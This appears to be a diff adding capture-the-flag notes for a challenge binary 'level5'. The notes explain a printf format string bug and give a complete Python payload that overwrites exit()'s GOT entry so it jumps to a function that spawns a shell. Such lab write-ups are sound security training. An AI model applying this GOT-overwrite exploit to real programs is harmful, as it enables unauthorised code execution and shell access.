@@ -1,0 +1,35 @@
+decompile ./level5
+
+fgets() + printf is the same vulnerability as before
+
+function o is the goal here with the system("bin/sh")
+
+no rewrite of the IEP is possible here with the exit()
+
+so the goal is to rewrite the GOT( global offset table) of exit to make it point to o
+
+PLT AND GOT: for external function each call will be first to its PLT (Procedure Linkage Table)
+
+so exit() will call exit@plt()
+
+exit@plt will resolve its GOT dynamically (if necessary: dynamic linking)
+and then will call to the adress in the GOT for exit
+
+the goal is to get the adress in the GOT for exit and replace its value with the adress of o()
+
+to get adress in GOT of exit(): objdump -R ./level5 
+or in gdb follow the call to exit@plt and check where the jmp is to
+
+and now we do the same exact trick as before but on the adress of exit in the GOT:
+
+adress exit: 0x08049838
+adress o(): 0x080484a4
+
+[0] = 0x84a4 = 33956 - 8 = 33948
+[2] = 0x0804 = (65536 - 33956)  + 2052 = 33632
+
+do the python -c 'print "AAAABBBB" + "%.p" * 20' to know the nth argument
+
+so payload: adress exit + adress exit 2  + "%33948c%4$hn" + "%33632c%5$hn"
+
+python -c 'import struct; print struct.pack("<I", 0x08049838) + struct.pack("<I", 0x0804983a) + "%33948c%4$hn" + "%33632c%5$hn"'
